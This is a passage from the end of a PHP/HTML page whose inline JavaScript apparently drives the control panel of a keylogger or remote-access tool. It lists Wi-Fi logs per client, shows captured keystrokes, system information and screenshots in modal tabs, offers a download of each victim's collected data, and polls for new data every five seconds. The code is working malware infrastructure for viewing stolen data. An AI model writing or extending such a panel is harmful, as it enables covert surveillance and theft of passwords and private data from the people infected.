                        logElement.addEventListener('click', () => openWifiModal(log));
                        wifiLogs.appendChild(logElement);
                    });
                })
                .catch(error => console.error('Error fetching Wi-Fi logs:', error));

            function openWifiModal(log) {
                const modal = document.getElementById('wifi-modal');
                document.getElementById('wifi-modal-client-id').textContent = log.client_id;
                document.getElementById('wifi-modal-created-at').textContent = new Date(log.created_at).toLocaleString();
                document.getElementById('wifi-modal-content').value = log.message || '{}';

                modal.style.display = 'block';
            }

            document.getElementById('close-wifi-modal').addEventListener('click', () => {
                document.getElementById('wifi-modal').style.display = 'none';
            });

            window.addEventListener('click', (event) => {
                if (event.target === document.getElementById('wifi-modal')) {
                    document.getElementById('wifi-modal').style.display = 'none';
                }
            });

            function openDataModal(data) {
                const modal = document.getElementById('data-modal');
                document.getElementById('data-modal-client-id').textContent = data.client_id;
                document.getElementById('data-modal-created-at').textContent = new Date(data.created_at).toLocaleString();
                document.getElementById('data-modal-keystrokes').value = data.keystrokes || 'No keystrokes';
                document.getElementById('data-modal-system-info').value = data.system_info || 'No system info';
                const screenshotImg = document.getElementById('data-modal-screenshot');
                screenshotImg.src = data.screenshot_url || '';
                screenshotImg.style.display = data.screenshot_url ? 'block' : 'none';

                const downloadButton = document.getElementById('data-download-data');
                downloadButton.onclick = () => {
                    window.location.href = `?download_user_data&data_id=${data.id}`;
                };

                const tabs = document.querySelectorAll('#data-modal .tab');
                const keystrokesEditor = document.getElementById('data-modal-keystrokes');
                const systemInfoEditor = document.getElementById('data-modal-system-info');
                const screenshotImgElement = document.getElementById('data-modal-screenshot');

                tabs.forEach(tab => {
                    tab.addEventListener('click', () => {
                        tabs.forEach(t => t.classList.remove('active'));
                        tab.classList.add('active');

                        keystrokesEditor.style.display = tab.dataset.tab === 'keystrokes' ? 'block' : 'none';
                        systemInfoEditor.style.display = tab.dataset.tab === 'system_info' ? 'block' : 'none';
                        screenshotImgElement.style.display = tab.dataset.tab === 'screenshot' && data.screenshot_url ? 'block' : 'none';
                    });
                });

                tabs[0].classList.add('active');
                keystrokesEditor.style.display = 'block';
                systemInfoEditor.style.display = 'none';
                screenshotImgElement.style.display = 'none';

                modal.style.display = 'block';
            }

            document.getElementById('close-log-modal').addEventListener('click', () => {
                document.getElementById('log-modal').style.display = 'none';
            });

            document.getElementById('close-data-modal').addEventListener('click', () => {
                document.getElementById('data-modal').style.display = 'none';
            });

            window.addEventListener('click', (event) => {
                if (event.target === document.getElementById('log-modal')) {
                    document.getElementById('log-modal').style.display = 'none';
                }
                if (event.target === document.getElementById('data-modal')) {
                    document.getElementById('data-modal').style.display = 'none';
                }
            });

            fetchLogsAndData();
            setInterval(fetchLogsAndData, 5000);
        </script>
    <?php endif; ?>
</body>

</html>